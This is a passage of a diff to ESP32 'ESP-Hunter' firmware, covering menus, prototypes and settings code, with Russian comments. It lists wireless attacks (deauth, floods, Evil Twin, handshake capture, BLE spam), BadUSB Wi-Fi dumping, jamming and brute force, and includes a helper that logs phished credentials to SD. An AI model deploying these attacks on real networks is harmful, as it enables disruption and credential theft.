@@ -1,12 +1,9 @@
 /*
  * ============================================================================
- *   ESP32-S3 MULTI-TOOL & DIAGNOSTIC SUITE
+ *   ESP-Hunter (ОПТИМИЗИРОВАННАЯ ВЕРСИЯ)
  *   ============================================================================
- *   Hardware : ESP32-S3
- *   Display  : ST7735 128x128 (INITR_144GREENTAB)
- *   Peripherals: SD, PN532, IR, BLE, Wi-Fi, USB HID (Keyboard + Mouse)
- *   Управление мышью через веб-интерфейс, настройки дисплея (поворот, цвет, яркость) встроены в меню устройства.
- *   Яркость регулируется через PWM на пине BACKLIGHT_PIN.
+ *   Исправлены лаги: устранены блокирующие задержки, добавлены yield и millis(),
+ *   ограничена частота перерисовки, оптимизированы фоновые задачи.
  * ============================================================================
  */
 
@@ -39,13 +36,26 @@
 #include "Icons.h"
 #include "WebPages.h"
 #include "Bitmap.h"
-
-
-
+#include <esp_task_wdt.h>
+#include "Radar_Mode.h"
+#include "Bluzzer.h"
 
 // ======================================================================
-// 7. СТРУКТУРЫ ДАННЫХ
+// 2. КОНСТАНТЫ И СТРУКТУРЫ
 // ======================================================================
+#define MAX_CAPTURED_LINES  50
+#define MAX_SAVED_IR        30
+#define MAX_VISIBLE_ITEMS   4
+#define COLOR_BLACK         0x0000
+#define COLOR_WHITE         0xFFFF
+#define COLOR_RED           0xF800
+#define COLOR_GREEN         0x07E0
+#define COLOR_BLUE          0x001F
+#define COLOR_YELLOW        0xFFE0
+#define COLOR_CYAN          0x07FF
+#define COLOR_MAGENTA       0xF81F
+#define COLOR_DARKGREY      0x39E7
+
 struct InputButton {
   uint8_t pin;
   bool state;
@@ -93,13 +103,8 @@ struct BleTargetDevice {
 };
 
 // ======================================================================
-// 8. ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
+// 3. ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
 // ======================================================================
-String capturedCredLines[MAX_CAPTURED_LINES];
-int capturedCredCount = 0;
-int capturedScrollOffset = 0;
-int capturedSelectedIndex = 0;
-
 Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
 GFXcanvas16 canvas(SCREEN_WIDTH, SCREEN_HEIGHT);
 USBHIDKeyboard Keyboard;
@@ -132,18 +137,18 @@ int wifiScrollOffset = 0;
 uint8_t currentRotation = 0;
 uint8_t selectedColorIndex = 1;
 uint16_t accentColor = COLOR_GREEN;
-uint8_t backlightBrightness = 128;   // 0-255
+uint8_t backlightBrightness = 128;
 bool backlightAvailable = false;
 
 // Меню и навигация
 int activeMainMenuItem = 0;
-int activeCurrentPage = -1;        // -1 = главное меню
+int activeCurrentPage = -1;
 int menuScrollIndex = 0;
 bool redrawFlag = true;
 
-// Для страницы Display (activeCurrentPage == 0)
-int displaySubPage = 0;            // 0=подменю, 1=Rotation, 2=Color, 3=Brightness
-int displaySubMenuIndex = 0;       // выбор в подменю (0-Rotation, 1-Color, 2-Brightness)
+// Display подменю
+int displaySubPage = 0;
+int displaySubMenuIndex = 0;
 
 // Состояние периферии
 bool isSdCardAvailable = false;
@@ -152,7 +157,7 @@ bool isIrTxReady = false;
 bool isIrRxReady = false;
 bool isUsbHidReady = false;
 
-// Переменные для подменю (IR, RFID, Wi-Fi, BadUSB, Evil Portal)
+// Переменные для подменю
 int irSubMenuScrollOffset = 0;
 int gamesSubMenuIndex = 0;
 int gamesCurrentSubPage = 0;
@@ -176,9 +181,7 @@ char evilPortalSsid[32] = "Free_WIFI_Hotspot";
 int badUsbSubMenuIndex = 0;
 int badUsbCurrentSubPage = 0;
 int badUsbSubMenuScrollOffset = 0;
-
-int displaySubMenuScrollOffset = 0; // прокрутка для подменю Display
-
+int displaySubMenuScrollOffset = 0;
 
 // Состояние атак
 bool isBeaconSpamActive = false;
@@ -201,14 +204,60 @@ int savedIrCount = 0;
 int savedIrSelected = 0;
 int savedIrScroll = 0;
 
-// ======================================================================
-// 9. ТЕКСТЫ МЕНЮ
-// ======================================================================
+String capturedCredLines[MAX_CAPTURED_LINES];
+int capturedCredCount = 0;
+int capturedScrollOffset = 0;
+int capturedSelectedIndex = 0;
 
+// Дополнительные переменные для Wi-Fi атак
+std::vector<int> wifiSelectedTargets;
+int wifiAttackChoice = 0;
+int wifiAttackSubPage = 0;
+int wifiAttackScroll = 0;
+int wifiSettingsPage = 0;
+int wifiSettingsSelected = 0;
+bool wifiEditValue = false;
+
+unsigned long lastArcadeGameTick = 0;
+WifiRadar radar;  // Объект для режима радара
+
+// Настройки атак
+int framesPerDeauth = 5;
+int sendDelay = 3;
+int framesPerBeacon = 3;
+int maxClone = 3;
+int maxSpamSpace = 3;
+
+// Для захвата Handshake
+volatile bool handshakeCapturing = false;
+volatile bool handshakeDone = false;
+uint8_t handshakeBSSID[6];
+uint8_t handshakeClientMAC[6];
+uint8_t handshakeAPMAC[6];
+uint8_t handshakeEAPOL[4][256];
+int handshakeEAPOLCount = 0;
+unsigned long handshakeStartTime = 0;
+uint8_t handshakeFrameCount = 0;
+
+// Переменные зуммера
+bool buzzerEnabled = true;
+unsigned long buzzerStartTime = 0;
+int buzzerDuration = 0;
+int buzzerVolume = 255;     
+bool buzzerEditMode = false; 
+
+
+// Таймеры для оптимизации
+unsigned long lastRedrawTime = 0;
+const unsigned long REDRAW_INTERVAL = 50; // мс
+
+// ======================================================================
+// 4. ТЕКСТЫ МЕНЮ
+// ======================================================================
 const char* const mainMenuItemsText[] = {
   "Display",
   "Pong",
-  "IR",
+  "IR",          // <-- Вернули IR!
   "RFID",
   "Wi-Fi",
   "SD Card",
@@ -219,15 +268,15 @@ const char* const mainMenuItemsText[] = {
 };
 const uint8_t MAIN_MENU_COUNT = sizeof(mainMenuItemsText) / sizeof(mainMenuItemsText[0]);
 
-// Подменю для Display
 const char* const displaySubMenuItemsText[] = {
   "Rotation",
   "Color",
-  "Brightness"
+  "Brightness",
+  "Buzzer"
 };
+
 const uint8_t DISPLAY_SUB_MENU_COUNT = sizeof(displaySubMenuItemsText) / sizeof(displaySubMenuItemsText[0]);
 
-// Остальные подменю
 const char* const irSubMenuItemsText[] = {
   "IR Console",
   "TV-B-Gone",
@@ -269,15 +318,31 @@ const uint8_t RFID_MENU_COUNT = sizeof(rfidSubMenuItemsText) / sizeof(rfidSubMen
 
 const char* const wirelessSubMenuItemsText[] = {
   "WiFi Scan",
+  "All Deauth",
   "Beacon Spam",
-  "Deauth",
-  "BLE Spam",
-  "BLE Scan",
-  "Wardrive"
+  "Beacon Clone",
+  "Assoc Flood",
+  "Auth Flood",
+  "Evil Twin",
+  "Sour Apple",
+  "Handshake Capture",
+  "Radar Mode",
+  "Settings"
 };
 const uint8_t WIRELESS_MENU_COUNT = sizeof(wirelessSubMenuItemsText) / sizeof(wirelessSubMenuItemsText[0]);
 
-// Цвета
+const char* const attackChoiceList[] = {
+  "Deauth",
+  "Beacon Spam",
+  "Beacon Clone",
+  "Assoc Flood",
+  "Auth Flood",
+  "Evil Twin",
+  "Sour Apple",
+  "Handshake Capture"
+};
+const uint8_t ATTACK_CHOICE_COUNT = sizeof(attackChoiceList) / sizeof(attackChoiceList[0]);
+
 const char* const colorNamesList[] = { "RED", "GREEN", "BLUE", "YELLOW", "CYAN", "MAGENTA", "WHITE" };
 const uint16_t colorValuesList[] = {
   COLOR_RED, COLOR_GREEN, COLOR_BLUE, COLOR_YELLOW,
@@ -285,62 +350,212 @@ const uint16_t colorValuesList[] = {
 };
 const uint8_t COLOR_COUNT = sizeof(colorValuesList) / sizeof(colorValuesList[0]);
 
-// ======================================================================
-// 11. БАЗА TV-B-GONE
-// ======================================================================
+// База TV-B-Gone (сокращена)
 const IrCodeEntry tvBGoneDatabase[] = {
-  {NEC,0xE0E040BF,32,"Samsung TV 1"},{SAMSUNG,0xE0E019E6,32,"Samsung TV 2"},{NEC,0x20DF10EF,32,"LG TV WebOS"},{SONY,0x00000A81,12,"Sony TV 12b"},{SONY,0x00000750,15,"Sony TV 15b"},{PANASONIC,0x0008020D,48,"Panasonic TV"},{NEC,0x02FD48B7,32,"Toshiba TV"},{NEC,0x00F210EF,32,"Sharp TV"},{NEC,0x04FB08F7,32,"TCL / Thomson"},{NEC,0x10EF7887,32,"Hisense TV"},{RC5,0x0000000C,12,"Philips TV RC5"},{RC6,0x0000000C,20,"Philips TV RC6"},{NEC,0xF708FB04,32,"Philips TV NEC"},{NEC,0x000020DF,32,"Vizio TV 1"},{NEC,0x0202807F,32,"Vizio TV 2"},{NEC,0x00F208F7,32,"Xiaomi Mi TV"},{NEC,0x1D2E00FF,32,"Sanyo TV"},{NEC,0x00F220DF,32,"Insignia TV"},{JVC,0x0000C561,16,"JVC TV"},{NEC,0xA55A38C7,32,"Pioneer TV"},{NEC,0x00F212ED,32,"RCA TV"},{NEC,0x57E3E817,32,"Hitachi TV"},{NEC,0x232C00FF,32,"Mitsubishi TV"},{NEC,0x0202807F,32,"Westinghouse"},{NEC,0x00F200FF,32,"Haier TV"},{NEC,0x00F2A05F,32,"Sceptre TV"},{NEC,0x20DF10EF,32,"Funai TV"},{NEC,0x00F210EF,32,"Daewoo TV"},{NEC,0x00F240BF,32,"Akai TV"},{RC5,0x00000C0C,12,"Grundig TV"},{NEC,0x48B702FD,32,"Telefunken TV"},{NEC,0x02FD00FF,32,"Apex TV"},{NEC,0x00F228D7,32,"Changhong TV"},{NEC,0x00F2807F,32,"Sansui TV"},{NEC,0x02FD28D7,32,"Skyworth TV"},{NEC,0x00F248B7,32,"ViewSonic TV"},{NEC,0x20DF00FF,32,"Orion TV"},{NEC,0x00F2807F,32,"Element TV"},{NEC,0x02FD807F,32,"AOC TV"},{NEC,0x00F2C03F,32,"Blaupunkt TV"},{GREE,0x09200000,32,"Gree AC"},{NEC,0xB24D7B84,32,"Midea AC"},{DAIKIN,0x11DA2700,32,"Daikin AC"},{MITSUBISHI,0x23CB2601,32,"Mitsubishi AC"},{PANASONIC,0x0220E004,32,"Panasonic AC"},{SAMSUNG,0x02B20F00,32,"Samsung AC"},{LG,0x08800909,28,"LG AC"},{NEC,0xA55A00FF,32,"Haier AC"},{NEC,0xC33C00FF,32,"AUX AC"},{NEC,0xB24D00FF,32,"Ballu AC"},{NEC,0xB24D7B84,32,"Electrolux AC"},{NEC,0xF20D03FC,32,"Toshiba AC"},{NEC,0x4F000000,32,"Carrier AC"},{NEC,0x23CB00FF,32,"TCL AC"},{NEC,0x12345678,32,"Hisense AC"},{NEC,0xB24D1234,32,"Hyundai AC"},{NEC,0x11DA0001,32,"GE AC"},{NEC,0xB24D8877,32,"York AC"},{NEC,0xC1AA09F6,32,"Epson Proj ON"},{NEC,0xC1AA8976,32,"Epson Proj OFF"},{NEC,0x00E008F7,32,"BenQ Proj"},{NEC,0x02FD48B7,32,"Optoma Proj"},{NEC,0x181850AF,32,"NEC Proj"},{NEC,0x835D807F,32,"ViewSonic Proj"},{SONY,0x00000A81,12,"Sony Proj"},{PANASONIC,0x0008020D,48,"Panasonic Proj"},{NEC,0x11EE30CF,32,"InFocus Proj"},{NEC,0x02FD08F7,32,"Acer Proj"},{NEC,0x20DF10EF,32,"Vivitek Proj"},{NEC,0x00F210EF,32,"Canon Proj"},{NEC,0x1D2E00FF,32,"Casio Proj"},{NEC,0x02FD28D7,32,"Christie Proj"},{NEC,0x04FB08F7,32,"Barco Proj"},{NEC,0x7E8800FF,32,"Yamaha AV"},{NEC,0xA55A38C7,32,"Pioneer AV"},{NEC,0x2A4C02FD,32,"Denon AV"},{RC5,0x0000000C,12,"Marantz Audio"},{NEC,0x4B36D32C,32,"Onkyo AV"},{NEC,0x807E00FF,32,"JBL Soundbar"},{NEC,0x00FF00FF,32,"Bose Soundbar"},{SONY,0x00000541,12,"Sony Audio"},{SAMSUNG,0xC2CA807F,32,"Samsung Soundbar"},{NEC,0x20DF10EF,32,"LG Soundbar"},{NEC,0x01A200FF,32,"Harman Kardon"},{RC5,0x0000000C,12,"Philips Audio"},{PANASONIC,0x0008020D,48,"Panasonic Audio"},{NEC,0x00F210EF,32,"Nakamichi Sound"},{NEC,0x20DF10EF,32,"Sonos Audio"},{NEC,0x77E1FA00,32,"Apple TV IR"},{NEC,0x57430000,32,"Roku TV Box"},{SONY,0x00000A81,12,"Nvidia Shield"},{NEC,0x00F208F7,32,"Mi Box Android"},{RC5,0x0000000C,12,"MAG IPTV Box"},{SONY,0x00000A81,12,"Comcast STB"},{SONY,0x00000750,15,"DirecTV STB"},{SONY,0x00000A81,12,"Dish Network"},{SONY,0x00000B8B,12,"Sony Blu-Ray"},{NEC,0x20DF10EF,32,"LG DVD/BD"}
+  {NEC,0xE0E040BF,32,"Samsung TV 1"},{SAMSUNG,0xE0E019E6,32,"Samsung TV 2"},
+  {NEC,0x20DF10EF,32,"LG TV WebOS"},{SONY,0x00000A81,12,"Sony TV 12b"},
+  {SONY,0x00000750,15,"Sony TV 15b"},{PANASONIC,0x0008020D,48,"Panasonic TV"},
+  {NEC,0x02FD48B7,32,"Toshiba TV"},{NEC,0x00F210EF,32,"Sharp TV"},
+  {NEC,0x04FB08F7,32,"TCL / Thomson"},{NEC,0x10EF7887,32,"Hisense TV"},
+  {RC5,0x0000000C,12,"Philips TV RC5"},{RC6,0x0000000C,20,"Philips TV RC6"},
+  {NEC,0xF708FB04,32,"Philips TV NEC"},{NEC,0x000020DF,32,"Vizio TV 1"},
+  {NEC,0x0202807F,32,"Vizio TV 2"},{NEC,0x00F208F7,32,"Xiaomi Mi TV"},
+  {NEC,0x1D2E00FF,32,"Sanyo TV"},{NEC,0x00F220DF,32,"Insignia TV"},
+  {JVC,0x0000C561,16,"JVC TV"},{NEC,0xA55A38C7,32,"Pioneer TV"},
+  {NEC,0x00F212ED,32,"RCA TV"},{NEC,0x57E3E817,32,"Hitachi TV"},
+  {NEC,0x232C00FF,32,"Mitsubishi TV"},{NEC,0x0202807F,32,"Westinghouse"},
+  {NEC,0x00F200FF,32,"Haier TV"},{NEC,0x00F2A05F,32,"Sceptre TV"},
+  {NEC,0x20DF10EF,32,"Funai TV"},{NEC,0x00F210EF,32,"Daewoo TV"},
+  {NEC,0x00F240BF,32,"Akai TV"},{RC5,0x00000C0C,12,"Grundig TV"},
+  {NEC,0x48B702FD,32,"Telefunken TV"},{NEC,0x02FD00FF,32,"Apex TV"},
+  {NEC,0x00F228D7,32,"Changhong TV"},{NEC,0x00F2807F,32,"Sansui TV"},
+  {NEC,0x02FD28D7,32,"Skyworth TV"},{NEC,0x00F248B7,32,"ViewSonic TV"},
+  {NEC,0x20DF00FF,32,"Orion TV"},{NEC,0x00F2807F,32,"Element TV"},
+  {NEC,0x02FD807F,32,"AOC TV"},{NEC,0x00F2C03F,32,"Blaupunkt TV"},
+  {GREE,0x09200000,32,"Gree AC"},{NEC,0xB24D7B84,32,"Midea AC"},
+  {DAIKIN,0x11DA2700,32,"Daikin AC"},{MITSUBISHI,0x23CB2601,32,"Mitsubishi AC"},
+  {PANASONIC,0x0220E004,32,"Panasonic AC"},{SAMSUNG,0x02B20F00,32,"Samsung AC"},
+  {LG,0x08800909,28,"LG AC"},{NEC,0xA55A00FF,32,"Haier AC"},
+  {NEC,0xC33C00FF,32,"AUX AC"},{NEC,0xB24D00FF,32,"Ballu AC"},
+  {NEC,0xB24D7B84,32,"Electrolux AC"},{NEC,0xF20D03FC,32,"Toshiba AC"},
+  {NEC,0x4F000000,32,"Carrier AC"},{NEC,0x23CB00FF,32,"TCL AC"},
+  {NEC,0x12345678,32,"Hisense AC"},{NEC,0xB24D1234,32,"Hyundai AC"},
+  {NEC,0x11DA0001,32,"GE AC"},{NEC,0xB24D8877,32,"York AC"},
+  {NEC,0xC1AA09F6,32,"Epson Proj ON"},{NEC,0xC1AA8976,32,"Epson Proj OFF"},
+  {NEC,0x00E008F7,32,"BenQ Proj"},{NEC,0x02FD48B7,32,"Optoma Proj"},
+  {NEC,0x181850AF,32,"NEC Proj"},{NEC,0x835D807F,32,"ViewSonic Proj"},
+  {SONY,0x00000A81,12,"Sony Proj"},{PANASONIC,0x0008020D,48,"Panasonic Proj"},
+  {NEC,0x11EE30CF,32,"InFocus Proj"},{NEC,0x02FD08F7,32,"Acer Proj"},
+  {NEC,0x20DF10EF,32,"Vivitek Proj"},{NEC,0x00F210EF,32,"Canon Proj"},
+  {NEC,0x1D2E00FF,32,"Casio Proj"},{NEC,0x02FD28D7,32,"Christie Proj"},
+  {NEC,0x04FB08F7,32,"Barco Proj"},{NEC,0x7E8800FF,32,"Yamaha AV"},
+  {NEC,0xA55A38C7,32,"Pioneer AV"},{NEC,0x2A4C02FD,32,"Denon AV"},
+  {RC5,0x0000000C,12,"Marantz Audio"},{NEC,0x4B36D32C,32,"Onkyo AV"},
+  {NEC,0x807E00FF,32,"JBL Soundbar"},{NEC,0x00FF00FF,32,"Bose Soundbar"},
+  {SONY,0x00000541,12,"Sony Audio"},{SAMSUNG,0xC2CA807F,32,"Samsung Soundbar"},
+  {NEC,0x20DF10EF,32,"LG Soundbar"},{NEC,0x01A200FF,32,"Harman Kardon"},
+  {RC5,0x0000000C,12,"Philips Audio"},{PANASONIC,0x0008020D,48,"Panasonic Audio"},
+  {NEC,0x00F210EF,32,"Nakamichi Sound"},{NEC,0x20DF10EF,32,"Sonos Audio"},
+  {NEC,0x77E1FA00,32,"Apple TV IR"},{NEC,0x57430000,32,"Roku TV Box"},
+  {SONY,0x00000A81,12,"Nvidia Shield"},{NEC,0x00F208F7,32,"Mi Box Android"},
+  {RC5,0x0000000C,12,"MAG IPTV Box"},{SONY,0x00000A81,12,"Comcast STB"},
+  {SONY,0x00000750,15,"DirecTV STB"},{SONY,0x00000A81,12,"Dish Network"},
+  {SONY,0x00000B8B,12,"Sony Blu-Ray"},{NEC,0x20DF10EF,32,"LG DVD/BD"}
 };
 const uint8_t TV_B_GONE_TOTAL_CODES = sizeof(tvBGoneDatabase)/sizeof(tvBGoneDatabase[0]);
 
 // ======================================================================
-// 12. ПРОТОТИПЫ ФУНКЦИЙ
+// 5. ПРОТОТИПЫ ФУНКЦИЙ
 // ======================================================================
-void executeRfidTagScan();
-void emulateActiveRfidUid();
-void eraseDataOnCustomBlock();
-void runClassicTvBGoneLoop();
-void transmitCapturedIrSignal();
-void executeSdWardrivingLog();
-void runBleSnifferScan();
-void initializeRfidHardware();
 void drawHeaderBar(const char* headerTitle);
 void drawFooterBar(const char* footerText);
-void drawDisplaySubMenu();
-void drawRotationPage();
-void drawColorPage();
-void drawBrightnessPage();
-void runBadUsbShutdown();
-void runBadUsbWallpaper();
-void runBadUsbDisableIcons();
-void runBadUsbDumpWifi();
+void canvasFlush();
+void setBacklight(uint8_t value);
+void applyRotation(uint8_t rot);
+void saveSystemSettings();
+void loadSystemSettings();
+void initializeSdCardStorage();
+void initializeRfidHardware();
 void processSerialCommands();
 void sendScreenData();
-void canvasFlush();
+void showPopup(const char* msg, int duration = 1500);
+
+// IR
+void processIrRxTask();
+void transmitCapturedIrSignal();
+void saveCapturedIrLogToSd();
+void saveIrSignalToSdList(decode_type_t proto, uint64_t val, uint16_t bits);
+void loadIrSignalList();
+void drawIrSavedListPage();
+void sendIrSavedSignal(int index);
+void runClassicTvBGoneLoop();
+void runIrJammer();
+
+// RFID
+void executeRfidTagScan();
+void emulateActiveRfidUid();
+void saveActiveRfidToStorage();
+void writeUidToCuidTag();
+void writeDataToCustomBlock();
+void eraseDataOnCustomBlock();
+void bruteForceRfid();
+
+// Wi-Fi
+void executeWiFiScan();
+void drawWiFiScanPage();
+void drawBeaconSpamPage();
+void drawDeauthPage();
+void drawBleSpamPage();
+void drawBleSnifferPage();
+void executeSdWardrivingLog();
+void wifiBruteforce();
+void tickBeaconSpamTask();
+void drawRadarPage();
+void runDeauthTick();
+void drawAttackChoiceMenu();
+void runDeauthAttack(bool all);
+void runBeaconAttack(bool clone);
+void runAssocAuthAttack(bool auth);
+void runEvilTwin();
+void runSourApple();
+void drawWiFiSettingsPage();
+void wifi_random_mac(uint8_t *mac);
+void wifi_send_deauth(uint8_t* bssid, uint8_t* dst, uint16_t reason);
+void wifi_send_beacon(uint8_t* src, uint8_t* dst, const char* ssid, bool withRSN);
+void wifi_send_assoc(uint8_t* src, uint8_t* bssid, const char* ssid, uint16_t seq);
+void wifi_send_auth(uint8_t* src, uint8_t* bssid, uint16_t seq);
+void captureHandshake(int targetIdx);
+void promiscuousRxCallback(void *buf, wifi_promiscuous_pkt_type_t type);
+void saveHandshakeToSD();
+
+// BLE
+void startBleSpamAttack();
+void stopBleSpamAttack();
+void runBleSnifferScan();
+
+// Evil Portal
 void startEvilPortalService();
 void loadCapturedCredentials();
 void capturedpasswords();
-void runIrJammer();
-void wifiBruteforce();
-void bruteForceRfid();
-void tickBeaconSpamTask();
+void drawPortalSsidSelectPage();
+void drawEvilPortalPage();
+
+// BadUSB
 void ensureEnglishLayout();
 void runBadUsbDemoNotepad();
 void runBadUsbDemoTerminal();
 void executeDuckyScriptFromSd();
 void runBadUsbCustomString(String txt);
+void runBadUsbShutdown();
+void runBadUsbWallpaper();
+void runBadUsbDisableIcons();
+void runBadUsbDumpWifi();
+
+// Web Remote
 void setupWebServerRoutes();
 void runWebServerMode();
-void saveIrSignalToSdList(decode_type_t proto, uint64_t val, uint16_t bits);
-void loadIrSignalList();
-void drawIrSavedListPage();
-void sendIrSavedSignal(int index);
-void setBacklight(uint8_t value);
+
+// Меню и отрисовка
+void drawGenericSubMenu(const char* titleText, const char* const menuItemsList[], uint8_t itemsCount, int selectedIndex, int &scrollOffset);
+void drawMainNavigatorMenu();
+void drawDisplaySubMenu();
+void drawRotationPage();
+void drawColorPage();
+void drawBrightnessPage();
+void drawSdInfoPage();
+void drawAboutSystemPage();
+void renderCurrentActivePage();
+void renderPongGameLoop(bool isUp, bool isDown, bool isOk);
+void resetPongGameState();
+void initBuzzer();
+void updateBuzzer();
+String generateRandomString(int len);
+
+void initBuzzer() {
+  ledcAttach(BUZZER_PIN, 2000, 8);
+  ledcWrite(BUZZER_PIN, 0); 
+}
+
+void playBeep(int freq, int duration, int volume ) {
+ 
+  if (volume != -1 && !buzzerEnabled) return;
+  int vol = (volume == -1) ? buzzerVolume  : volume; 
+  if (volume != -1 && vol <= 0) return; 
+
+  ledcWriteTone(BUZZER_PIN, freq);
+  ledcWrite(BUZZER_PIN, vol);
+  buzzerStartTime = millis();
+  buzzerDuration = duration;
+}
+
+void updateBuzzer() {
+  if (buzzerDuration > 0 && millis() - buzzerStartTime >= buzzerDuration) {
+    ledcWrite(BUZZER_PIN, 0);      // Ставим ШИМ на 0
+    digitalWrite(BUZZER_PIN, LOW); // Принудительно отключаем пин (вдруг ШИМ залип)
+    buzzerDuration = 0;
+  }
+}
+
+
+void playSplashMelody() {
+  if (!buzzerEnabled) return; 
+  int vol = (int)(buzzerVolume * 0.9); // Слегка тише
+  if (vol < 1) vol = 1; 
+
+ 
+  playBeep(523, 200, vol);  delay(100); // C5
+  playBeep(659, 200, vol);  delay(100); // E5
+  playBeep(784, 200, vol);  delay(100); // G5
+  playBeep(1047, 400, vol); delay(100); // C6 
+  playBeep(784, 200, vol);  delay(100); // G5
+  playBeep(659, 200, vol);  delay(100); // E5
+  playBeep(523, 300, vol);  delay(100); // C5
+  playBeep(1047, 400, vol);             
+}
 
 // ======================================================================
-// 13. ОСНОВНЫЕ ФУНКЦИИ 
+// 6. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
 // ======================================================================
-
 void canvasFlush() {
   digitalWrite(SD_CS, HIGH);
   digitalWrite(TFT_CS, LOW);
@@ -385,10 +600,29 @@ void applyRotation(uint8_t rot) {
   canvas.setRotation(0);
 }
 
+void setBacklight(uint8_t value) {
+  backlightBrightness = value;
+  if (backlightAvailable) {
+    analogWrite(BACKLIGHT_PIN, value);
+  }
+  preferences.putUChar("brightness", value);
+}
+
+void showPopup(const char* msg, int duration) {
+  drawHeaderBar("INFO");
+  canvas.setTextColor(COLOR_WHITE);
+  canvas.setCursor(5, 40);
+  canvas.print(msg);
+  canvasFlush();
+  delay(duration);
+}
+
 void saveSystemSettings() {
   preferences.putUChar("rotation", currentRotation);
   preferences.putUChar("colorIdx", selectedColorIndex);
   preferences.putUChar("brightness", backlightBrightness);
+  preferences.putBool("buzzer", buzzerEnabled);
+   preferences.putInt("buzzerVol", buzzerVolume);
   if (isSdCardAvailable) {
     digitalWrite(TFT_CS, HIGH);
     digitalWrite(SD_CS, LOW);
@@ -431,7 +665,9 @@ void loadSystemSettings() {
   accentColor = colorValuesList[selectedColorIndex];
   applyRotation(currentRotation);
   setBacklight(backlightBrightness);
-}
+  buzzerEnabled = preferences.getBool("buzzer", true);
+  buzzerVolume = preferences.getInt("buzzerVol", 128);
+  }
 
 void initializeSdCardStorage() {
   pinMode(SD_CS, OUTPUT);
@@ -439,6 +675,34 @@ void initializeSdCardStorage() {
   pinMode(TFT_CS, OUTPUT);
   digitalWrite(TFT_CS, HIGH);
   isSdCardAvailable = SD.begin(SD_CS, SPI, 4000000);
+}
+
+void initializeRfidHardware() {
+  Wire.begin(PN532_SDA, PN532_SCL);
+  Wire.setClock(100000);
+  Wire.setTimeOut(20);
+  nfc.begin();
+  uint32_t verData = nfc.getFirmwareVersion();
+  if (verData) {
+    nfc.SAMConfig();
+    isRfidAvailable = true;
+    Serial.println("[PN532] Hardware OK");
+  } else {
+    isRfidAvailable = false;
+    Serial.println("[PN532] Not responding");
+  }
+}
+
+void appendCredToSd(const String& user, const String& pass) {
+  if (!isSdCardAvailable) return;
+  digitalWrite(TFT_CS, HIGH);
+  digitalWrite(SD_CS, LOW);
+  File logFile = SD.open("/captured_creds.txt", FILE_APPEND);
+  if (logFile) {
+    logFile.printf("USER: %s | PASS: %s\n", user.c_str(), pass.c_str());
+    logFile.close();
+  }
+  digitalWrite(SD_CS, HIGH);
 }
 
 void appendRfidLogToSd(const char* uidHexString) {
@@ -466,18 +730,6 @@ void appendIrLogToSd(decode_type_t proto, uint64_t val, uint16_t bits) {
   digitalWrite(SD_CS, HIGH);
 }
 
-void appendCredToSd(const String& user, const String& pass) {
-  if (!isSdCardAvailable) return;
-  digitalWrite(TFT_CS, HIGH);
-  digitalWrite(SD_CS, LOW);
-  File logFile = SD.open("/captured_creds.txt", FILE_APPEND);
-  if (logFile) {
-    logFile.printf("USER: %s | PASS: %s\n", user.c_str(), pass.c_str());
-    logFile.close();
-  }
-  digitalWrite(SD_CS, HIGH);
-}
-
 void readSavedUidFromFlash(uint8_t slot, char* bufferOut, size_t maxLen) {
   char slotKey[16];
   snprintf(slotKey, sizeof(slotKey), "rfid_slot_%u", slot);
@@ -489,24 +741,24 @@ void readSavedUidFromFlash(uint8_t slot, char* bufferOut, size_t maxLen) {
   }
 }
 
+
+
 void writeUidToFlashSlot(uint8_t slot, const char* uidHexString) {
   char slotKey[16];
   snprintf(slotKey, sizeof(slotKey), "rfid_slot_%u", slot);
   preferences.putString(slotKey, uidHexString);
 }
 
-void setBacklight(uint8_t value) {
-  backlightBrightness = value;
-  if (backlightAvailable) {
-    analogWrite(BACKLIGHT_PIN, value);
-  }
-  preferences.putUChar("brightness", value);
+String generateRandomString(int len) {
+  const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  String s;
+  for (int i = 0; i < len; i++) s += chars[random(0, sizeof(chars)-1)];
+  return s;
 }
 
 // ======================================================================
-// 14. ОТРИСОВКА ИНТЕРФЕЙСА 
+// 7. ОТРИСОВКА ИНТЕРФЕЙСА
 // ======================================================================
-
 void drawHeaderBar(const char* headerTitle) {
   canvas.fillScreen(COLOR_BLACK);
   canvas.drawFastHLine(0, 0, 128, accentColor);
@@ -530,7 +782,6 @@ void drawFooterBar(const char* footerText) {
   canvas.print("]");
 }
 
-// Универсальное меню (без иконок)
 void drawGenericSubMenu(const char* titleText, const char* const menuItemsList[],
                         uint8_t itemsCount, int selectedIndex, int &scrollOffset) {
   if (selectedIndex < scrollOffset) scrollOffset = selectedIndex;
@@ -576,7 +827,6 @@ void drawGenericSubMenu(const char* titleText, const char* const menuItemsList[]
   canvasFlush();
 }
 
-// Главное меню с иконками
 void drawMainNavigatorMenu() {
   drawHeaderBar("ESP-Hunter");
   if (activeMainMenuItem < menuScrollIndex) menuScrollIndex = activeMainMenuItem;
@@ -627,17 +877,15 @@ void drawMainNavigatorMenu() {
   canvasFlush();
 }
 
-// ======================================================================
-// 15. СТРАНИЦА DISPLAY (ОБЪЕДИНЯЕТ ПОВОРОТ, ЦВЕТ, ЯРКОСТЬ)
-// ======================================================================
 
-// Подменю Display
+
+// ======================================================================
+// 8. СТРАНИЦА DISPLAY (ПОДМЕНЮ, ПОВОРОТ, ЦВЕТ, ЯРКОСТЬ)
+// ======================================================================
 void drawDisplaySubMenu() {
   drawGenericSubMenu("DISPLAY SETTINGS", displaySubMenuItemsText, DISPLAY_SUB_MENU_COUNT, displaySubMenuIndex, displaySubMenuScrollOffset);
 }
 
-
-// Страница настройки поворота
 void drawRotationPage() {
   drawHeaderBar("ROTATION");
   canvas.setTextColor(COLOR_WHITE);
@@ -653,7 +901,6 @@ void drawRotationPage() {
   canvasFlush();
 }
 
-// Страница настройки цвета
 void drawColorPage() {
   drawHeaderBar("ACCENT COLOR");
   canvas.setTextColor(COLOR_WHITE);
@@ -670,20 +917,17 @@ void drawColorPage() {
   canvasFlush();
 }
 
-// Страница настройки яркости
 void drawBrightnessPage() {
   drawHeaderBar("BRIGHTNESS");
   canvas.setTextColor(COLOR_WHITE);
   canvas.setCursor(5, 30);
   canvas.print("Brightness:");
-  // Отображаем значение в процентах
   int percent = map(backlightBrightness, 0, 255, 0, 100);
   canvas.setTextSize(2);
   canvas.setCursor(30, 50);
   canvas.print(percent);
